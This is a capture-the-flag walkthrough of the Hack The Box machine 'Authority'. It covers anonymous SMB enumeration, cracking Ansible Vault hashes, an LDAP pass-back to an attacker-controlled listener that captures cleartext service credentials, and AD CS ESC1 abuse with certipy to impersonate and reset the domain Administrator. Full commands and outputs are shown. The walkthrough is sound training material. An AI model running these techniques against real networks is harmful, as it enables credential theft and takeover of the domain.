
<div id="tsparticles"></div>
<br></br>

<h1 style="text-align:center;font-size:2em;color:#595454"><span style="color:#ff7b00">───────//</span> Hack The Box - Authority <span style="color:#ff7b00">//───────</span></h1>

<br></br>

> [!example] **Briefing**
> **Authority is a medium-rated Windows machine which is part of the CPTS Preparation Track on Hack The Box.**
>
> **The machine challenges users to exploit SMB misconfigurations, such as anonymous access and insufficient permissions, which can lead to the disclosure of sensitive information. Credentials discovered in the exposed files provide access to a web application running Apache Tomcat Configuration Editor.** 
> **By accessing the Configuration Editor, we can manipulate the LDAP connection settings and capture additional credentials. These credentials allow us to exploit the ESC1 vulnerability in Active Directory Certificate Services (AD CS), obtain a certificate for the Administrator account, and ultimately gain administrative access to the domain.**

<br></br>
<span style="color:rgb(89, 84, 84)"><h1 style="text-align: center; font-size: 2em;"></span>
<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">Information Gathering</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
<span style="color:rgb(89, 84, 84)"></h1></span>
<br></br>

---
<h3 align="center"><span style="color:rgb(89, 84, 84)">Machine Information</span></h3>
<p align="center"><span style="color:rgb(89, 84, 84)">Operating System: Windows (Active Directory)</span></p>
<p align="center"><span style="color:rgb(89, 84, 84)">Provided Credentials: None</span></p>
<p align="center"><span style="color:rgb(89, 84, 84)">Topics: SMB, LDAP, AD CS, ESC1</span></p>

---
<br></br>

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Nmap: SYN Initial Scan <span style="color:#ff7b00"></span></h2>
<br></br>

**We will begin this CTF with an Nmap scan, if you're following along with it I recommend making a folder structure like `/home/kali/htb/authority/nmap` to keep things a little clearer.**

**By using Nmap, we can first scan for ports without additional information such as service or version. To do this, we use the `-sS` option (SYN scan) and save the output in our newly created `nmap` directory.**

```
nmap -Pn -sS -T4 -p- -v 10.129.229.56 -oA authority_initial
```

> [!help]- Nmap-Options
> | Option     | Description                                                           |
| ---------- | --------------------------------------------------------------------- |
| **`-Pn`**  | Treat all hosts as online - skip host discovery                       |
| **`-sS`**  | SYN Scan - only scan for ports (open, closed, filtered)               |
| **`-T4`**  | Aggressive Mode     |
| **`-p-`**  | scan all 65535 ports                                                  |
| **`-v`** | verbose output                                                   |
| **`-oA`**  | Output in the three major formats at once (normal, XML, and grepable) |

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Grep All Ports from Nmap Output <span style="color:#ff7b00"></span></h3>
<br></br>

**Use the `grep`, `cut`, and `paste` commands to extract only the open ports, separated by commas which we need for our next scan.**

```
grep -E '^[0-9]+/tcp[[:space:]]+open' authority_initial.nmap | cut -d '/' -f1 | paste -sd,
```

![[Pasted image 20261114194500.png|700]]

> [!help]- Grep-Options
> | Option                 | Description                                                              |
| ---------------------- | ------------------------------------------------------------------------ |
| **`-E`**               | Allows advanced regex syntax.                                            |
| **`^`**                | Start of line                                                            |
| **`[0-9]+/tcp`**       | One or more numbers, and string "/tcp"                                  |
| **`[[:space:]]+open`** | at least one space or tab, and string "open"                             |
| **`cut -d '/' -f1`**   | use "/" as delimiter and keep the first field from the Nmap output file. |
| **`-s`**               | do not print lines not containing delimiters                             |
| **`-d,`**              | use DELIM instead of TAB for field delimiter                             |

---

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Nmap: Detailed Scan <span style="color:#ff7b00"></span></h2>

<br></br>

**For further enumeration, we use `-sV`, but instead of scanning all ports again, we reuse the list we just created. Ports marked as "unknown" are excluded, since they wouldn't provide reliable results.** 

```
┌──(kali㉿kali)-[~/htb/authority/nmap]
└─$ nmap -Pn -sV -O -T4 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001 -vvv 10.129.229.56 -oA authority_detailed_scan
```

> [!help]- Nmap-Options
> | Option    | Description                                        |
| --------- | -------------------------------------------------- |
| **`-sV`** | Probe open ports to determine service/version info |
| **`-O`**  | Enable OS detection                                |
| **`-p`**  | Scan specific ports                                |

![[Pasted image 20261114195011.png|700]]
- **Domain: *authority.htb* (We can add this to /etc/hosts now.)**

> [!NOTE]- Add a Host to /etc/hosts
> ```echo "10.129.229.56 authority.htb" | sudo tee -a /etc/hosts```

<br></br>

---

> [!important] Identifying the Entry Point
> Since no initial credentials were provided and we already know that our target is running Active Directory, a good starting point would be to enumerate exposed services such as SMB, checking for potential anonymous access. 

---

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Server Message Block <span style="color:#ff7b00"></span></h2>

<br></br>

**Using `smbclient` we can try to get anonymous access to list all available shares.**
```
┌──(kali㉿kali)-[~/htb/authority]
└─$ smbclient -N -L //10.129.229.56/
```

> [!help]- Smbclient No Password Authentication
> | Options  | Description                              |
| -------- | ---------------------------------------- |
| **`-N`** | Don't ask for a password                 |
| **`-L`** | Get a list of shares available on a host |

![[Pasted image 20261114200741.png]]
- **There are two non default SMB shares we can try to access as anonymous.**

<br></br>

---

> [!danger] SMB Dangerous Configuration
> A common SMB configuration is "`guest ok = yes`" which can pose a security risk if permissions are not properly managed. This may e.g. lead to sensitive information disclosure if anonymous users can access files within a share. 

---

<br></br>

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Department Shares - Access Denied <span style="color:#ff7b00"></span></h3>

<br></br>

**The "Department Shares" directory has restricted access. Without the appropriate user credentials, we cannot access this share. Therefore, we can move on to the next one and potentially revisit it later once we have obtained valid credentials.**

```
┌──(kali㉿kali)-[~/htb/authority]
└─$ smbclient -N //10.129.229.56/"Department Shares"
```

![[Pasted image 20261114201122.png]]

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Development - Anonymous Access Granted <span style="color:#ff7b00"></span></h3>

<br></br>

**By connecting to the `Development` share using `smbclient` without providing credentials, we can confirm that anonymous access is permitted.**

```
┌──(kali㉿kali)-[~/htb/authority]
└─$ smbclient -N //10.129.229.56/Development
```

![[Pasted image 20261114201250.png]]

```
smb: \Automation\> cd Ansible
smb: \Automation\Ansible\> ls
  .                                   D        0  Fri Mar 17 09:20:50 2023
  ..                                  D        0  Fri Mar 17 09:20:50 2023
  ADCS                                D        0  Fri Mar 17 09:20:48 2023
  LDAP                                D        0  Fri Mar 17 09:20:48 2023
  PWM                                 D        0  Fri Mar 17 09:20:48 2023
  SHARE                               D        0  Fri Mar 17 09:20:48 2023
```

**After browsing through the directory structure, we discover an `Automation/Ansible` directory containing several subdirectories, including `ADCS`, `LDAP`, `PWM` and `SHARE`.**

<br></br>

---

> [!tip] Thoughts
> This indicates that the share contains configuration files related to different services used within the domain, which may provide useful information for further enumeration.

---

<br></br>
<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Downloading Ansible Directory <span style="color:#ff7b00"></span></h3>

<br></br>

**To download files and directories recursively, we enable `recurse` and disable the interactive prompt using `prompt`. We can then use `mget` to download the entire `Ansible` directory and its contents.**

```
smb: \Automation\> recurse ON
smb: \Automation\> prompt OFF
smb: \Automation\> lcd .
smb: \Automation\> mget Ansible
```

>[!help]- Recurse Download SMB in detail
>| Command        | Description                                                   |
| -------------- | ------------------------------------------------------------- |
| `recurse ON`   | Enables downloading files from subdirectories.                |
| `prompt OFF`   | Disables confirmation prompts for each file.                  |
| `lcd .`        | Sets the local download directory to the current directory.   |
| `mget Ansible` | Downloads the complete `Ansible` directory structure. |

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Searching for Information Disclosure <span style="color:#ff7b00"></span></h3>

<br></br>

**The following command recursively searches the specified folders for files containing sensitive keywords (passwords, secrets, API keys, tokens) and lists matching filenames.**

```
┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ grep -rniE 'pass(word)?|pwd|secret|credential|api[\_-]?key|token|connectionstring' ADCS LDAP PWM SHARE --include='*.*' -l

ADCS/defaults/main.yml
ADCS/README.md
ADCS/tox.ini
ADCS/tasks/init_ca.yml
ADCS/tasks/assert.yml
ADCS/tasks/generate_ca_certs.yml
ADCS/tasks/requests.yml
ADCS/templates/openssl.cnf.j2
ADCS/vars/main.yml
LDAP/defaults/main.yml
LDAP/TODO.md
LDAP/README.md
LDAP/tasks/main.yml
LDAP/templates/sssd.conf.j2
LDAP/.travis.yml
PWM/defaults/main.yml
PWM/README.md
PWM/templates/tomcat-users.xml.j2
```

> [!help]- Grep Command in Detail
> | Option | Description                                                                                                        |
| ------ | ------------------------------------------------------------------------------------------------------------------ |
| `grep` | searches for patterns in each file                                                                                    |
| `-r`   | Read all files under each directory recursively.                                                                   |
| `-n`   | Prefix each line of output with the 1-based line number within its input file.                                     |
| `-i`   | Ignore case distinctions in patterns and input data, so that characters that differ only in case match each other. |
| `-E`   | Interpret _PATTERNS_ as extended regular expressions                                                               |
| `\|`   | OR between keywords                                                                                                |
| `-l`   | only output file names                                                                                             |

> [!info]- Connection String Explained
> A connection string is a string that contains all the information needed to establish a connection to a service or a database. An example for a SQL Server Connection String looks like this:
`Server=10.10.10.5;`
`Database=Production;`
`User Id=admin;`
`Password=SuperSecret123!;`

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Ansible Vault Hashes <span style="color:#ff7b00"></span></h3>

<br></br>

##### **What is Ansible Vault?**
**"Ansible Vault** is a built-in feature of Ansible that allows you to **encrypt sensitive data** within your Ansible files. It enables teams to securely store secrets while still benefiting from automation and version control."
<div align="right"><a href="https://medium.com/@ahemad01/what-is-ansible-vault-e1ba71d2fd32">Source: Medium</a></div>

```
cat PWM/defaults/main.yml
```

**Searching through the files we just filtered, `main.yml` contains three vault hashes.** 

![[Pasted image 20261114213026.png|410]]


<br></br>

---

> [!summary] Plan the Next Steps
> The official Ansible documentation provides instructions on how to decrypt these hashes. It also includes an example of the required hash format as well as the requirement for a password. To match this format, we first need to convert the extracted hashes using John the Ripper and then crack the hash to get its password using a password-cracking tool like Hashcat. 

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Preparing Vault Hash File <span style="color:#ff7b00"></span></h3>

<br></br>

```
┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ cat << 'EOF' | sed 's/^[[:space:]]*//' > pwm_admin_login.txt
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
EOF
```
- **Use `cat` and `EOF` to write each hash clean into a `.txt` file.**

> [!help]- `sed` Command
> The `sed` command is used to remove all `spaces` at the beginning of each line before writing it to the file `pwm_admin_login.txt`. 

---

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Cracking Vault Hash <span style="color:#ff7b00"></span></h2>

<br></br>

### Making the file Hashcat readable using John

**At this stage, we use `ansible2john` to convert the Ansible Vault hash into a format that John the Ripper and Hashcat can process. Ansible Vault hashes use the `$ANSIBLE_VAULT;1.1;AES256` header, which identifies the encrypted data and its format.**

- **First confirm there is a module for Ansible in `2john` by simply using the `locate` command with wildcards at the beginning and the end to make sure we get every file:**

```
locate *2john*
```

![[Pasted image 20261115190112.png]]

**The command for `ansible2john` looks like this:**
```
┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ ansible2john pwm_admin_login.txt > pwm_admin_login.hash
```

**The `$ansible$` format is generated by `ansible2john` and can be used with password-cracking tools such as Hashcat or John the Ripper.**
```
┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ cat pwm_admin_login.hash 
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
```

---

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Cracking Ansible Vault Hash Password <span style="color:#ff7b00"></span></h2>
<br></br>

**Hashcat supports hundreds of hash types, each identified by a specific mode number. To find the correct one for our Ansible Vault hash, we search for "$ansible" on [Hashcat's Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page, which lists example hashes alongside their corresponding mode. This confirms that mode `16900` is the correct choice for cracking Ansible Vault hashes.**
### Hashcat
```
┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ hashcat -m 16900 pwm_admin_login.hash /usr/share/wordlists/rockyou.txt
```

>[!note]- Hashcat Command Explanation
>| Option                                 | Description                                  |
| -------------------------------------- | -------------------------------------------- |
| **`-m 16900`**                         | Hashcat mode from the Hashcat examples documentation |
| **`pwm_admin_login.hash`**             | Hashcat readable vault hash file                             |
| **`/usr/share/wordlists/rockyou.txt`** | Path to rockyou.txt wordlist containing millions of passwords                 |

**We can repeat this with the two remaining hashes and will always get the same password: `!@#$%^&*`** 

```
┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ hashcat --show pwm_admin_login.hash /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20261120223000.png]]

---

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Decrypt Ansible Vault Hash <span style="color:#ff7b00"></span></h2>

<br></br>

**The official documentation mentions how to decrypt the hash. To do this, we need the password we cracked using Hashcat. We repeat this step for all three `.txt` files.**

```
┌──(kali㉿kali)-[~/htb/authority/Ansible] 
└─$ ansible-vault decrypt pwm_admin_login.txt Vault password: Decryption successful
```

```
┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ cat pwm_admin_login.txt
svc_pwm


┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ cat pwm_admin_password.txt 
pWm_@dm!N_!23


┌──(kali㉿kali)-[~/htb/authority/Ansible]
└─$ cat ldap_admin_password.txt
DevT3st@123

```

**Now we need to find a service to enter these credentials. To find our next attack vector I will go back to `authority_detailed_scan.nmap` and list interesting services.** 

> [!example]- Services
> | Service                                   | Thoughts                                                                                                                          |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| **Server Message Block**                  | If we can login to SMB we probably can access the share `Department Shares`.                                                         |
| **Lightweight Directory Access Protocol** | If the credentials fit here there are multiple things we could do, like getting the Bloodhound file to enumerate the Domain further. |
| **Apache Tomcat**                         | There is a Web Application navigating to https://10.129.229.56:8443/                                                                 |

---

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> LDAP Pass-back <span style="color:#ff7b00"></span></h2>

<br></br>

**Out of the services listed above, the web application stood out as the easiest next step.**
**Navigating to [https://10.129.229.56:8443/](https://10.129.229.56:8443/) leads us to the Apache Tomcat application, where we access the "Configuration Editor". The password `pWm_@dm!N_!23` grants us access.**

![[Pasted image 20261116175026.png|394]]

**Navigating the LDAP directory path `LDAP -> LDAP Directories -> default -> Connection`.** 
**The page is used to configure the application's connection to the LDAP server. We are able to add a new value and delete the existing one. 
We know that the LDAP service is running on port 389 this is important because LDAP is not encrypted. Add `ldap://<attacker_IP>:389` to the LDAP URLs.** 
![[Pasted image 20261116180626.png]]

**Before we run `Test LDAP Profile`, start Netcat listener:** 
```
┌──(kali㉿kali)-[~/htb/authority]
└─$ nc -lvnp 389
```


> [!NOTE]- Netcat-Options
> | Option | Description                       |
| ------ | --------------------------------- |
| **-l** | listen mode, for inbound connects |
| **-v** | verbose                           |
| **-n** | numeric-only IP addresses, no DNS |
| **-p** | local port number                 |

- **Then run `Test LDAP Profile`.**

![[Pasted image 20261115213928.png]]
- **we successfully grabbed the ldap banner.**
- **What we're looking at is the Distinguished Name (DN)** 
- **`CN`: The Common Name is a new username we can make use of.**

**The most interesting thing to mention here is that LDAP is once again unencrypted. Since we are listening on port 389 (LDAP), we can capture the credentials transmitted in cleartext between the web application and our machine.** 

- **Found credentials: `svc_ldap`:`lDaP_1n_th3_cle4r!`**

![[Pasted image 20261118002429.png]]
- **Wireshark displays an unencrypted LDAP Simple Bind Request in which the credentials for the svc_ldap service account are transmitted in plain text.**

---

<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Domain Enumeration via Bloodhound <span style="color:#ff7b00"></span></h2>

<br></br>

**BloodHound is a powerful tool for Active Directory enumeration. To use it, we first collect data from the domain by generating a dump and then import it into BloodHound for visualization and analysis of potential attack paths.**

```
nxc ldap 10.129.229.56 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d authority.htb --dns-server 10.129.229.56 --bloodhound -c All
```

![[Pasted image 20261115214436.png]]


> [!info] Find an Attack Path 
> Since `SVC_LDAP` is a member of the `Domain Users` group, and `Domain Users` has Enroll rights on the `ClientAuth` certificate template, `SVC_LDAP` can request a certificate from this template. However, enrollment rights alone are not a vulnerability. To find out whether the template is actually exploitable, we need more information about the domain, and `certipy-ad` is very handy for this kind of enumeration.

<br></br>

<span style="color:rgb(89, 84, 84)"><h1 style="text-align: center; font-size: 2em;"></span>
<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">Exploitation</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
<span style="color:rgb(89, 84, 84)"></h1></span>

<br></br>

**We can scan for known vulnerabilities with the following `certipy-ad` command.**

```
certipy-ad find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable
```

**The output gives us a lot of useful information like the CA-Name, DNS Name (we can add this one to our host file using e.g. `sudo nano /etc/hosts`) and the Template Name.** 
**This will be important for commands we will use in the following steps.**

![[Pasted image 20261115222108.png]]

![[Pasted image 20261115223949.png]]

![[Pasted image 20261116213744.png]]
**Only Domain Computers can use the CorpVPN template.**

<br></br>

---

> [!important] What is ESC1?
> ESC1 occurs when a certificate template allows the requester to specify an arbitrary Subject Alternative Name (SAN), has the Client Authentication EKU, and is enrollable by low-privileged users without manager approval. This means we can request a certificate while specifying any UPN we want including the Administrator's and later use that certificate to authenticate as that user.

---
<h2 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Checking  ms-DS-MachineAccountQuota <span style="color:#ff7b00"></span></h2>
<br></br>

**It's possible to give domain users the permission to create domain computers, we can check if the user `svc_ldap` is permitted to do so. The `netexec` command below will output how many we can add to the domain.**

```
netexec ldap 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
```
- **`-M maq`: is the Module for `MachineAccountQuota`**

![[pasted-image-computerquata10.png]]

<br></br>

---

> [!tip] Tip
> The command `nxc ldap -L` lists available LDAP-Modules.

---

<h3 style="text-align:center;color:#595454"><span style="color:#ff7b00"></span> Add a Machine Account <span style="color:#ff7b00"></span></h3>

**While `svc_ldap` has enrollment rights on the `ClientAuth` template as a member of `Domain Users`, the vulnerable `CorpVPN` template is only enrollable by Domain Computer accounts — which is why we first need to create one using the Machine Account Quota.**
<br></br>

```
impacket-addcomputer -computer-name 'PENTEST$' -computer-pass 'S3cUrP455w0rD!' -dc-ip 10.129.229.56 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account PENTEST$ with password S3cUrP455w0rD!.
```
- **The new Domain Computer was created successfully**

**The earlier `certipy-ad find -vulnerable` output flagged `CorpVPN` as vulnerable to ESC1: it allows enrollee-supplied subject names, grants Client Authentication, and `Domain Computers` have enrollment rights on it. This makes it the right template to target for impersonating the Administrator.** 
```
certipy-ad req -username 'PENTEST$' -password 'S3cUrP455w0rD!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb -dns authority.htb

Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator_authority.pfx'
[*] Wrote certificate and private key to 'administrator_authority.pfx'
```

**We can use this certificate to authenticate as administrator to change the users password, to do so we can use `-ldap-shell` which starts an interactive shell.**
```
certipy-ad auth -ldap-shell -pfx administrator_authority.pfx -dc-ip 10.129.229.56 -username administrator -domain authority.htb
```

**The `help` command lists commands, their syntax and a short description.** 
**The syntax to change the password would be:**

```
change_password administrator N3wP455w0rD
```

![[Pasted image 20261116223447.png]]

**The password was changed successfully, now we can login to the domain as administrator.**

<br></br>

<span style="color:rgb(89, 84, 84)"><h1 style="text-align: center; font-size: 2em;"></span>
<span style="color:rgb(89, 84, 84)"><span style="color:rgb(255, 123, 0)">───────//</span> <span style="color:rgb(89, 84, 84)">Post-Exploitation</span> <span style="color:rgb(255, 123, 0)">//───────</span></span>
<span style="color:rgb(89, 84, 84)"></h1></span>

<br></br>

**Looking into the Nmap scan once more port `5985` is open by default the service running here is `WinRM HTTP`. Making use of `evil-winrm` connecting remotely to the domain as administrator.** 
```
evil-winrm -i 10.129.229.56 -u administrator -p 'N3wP455w0rD'
```

![[Pasted image 20261116223739.png]]

***And that's it. In a real-world engagement, we would move laterally, gather information about the customer, and possibly deploy a backdoor. In a CTF, however, all we're after are the user and root flags. I won't explain how to find them, since they aren't hard to find, and I don't want to give the impression that we do all of this just for a flag. The knowledge we gain from this kind of gamified learning matters far more than any ranking or level we might reach.***
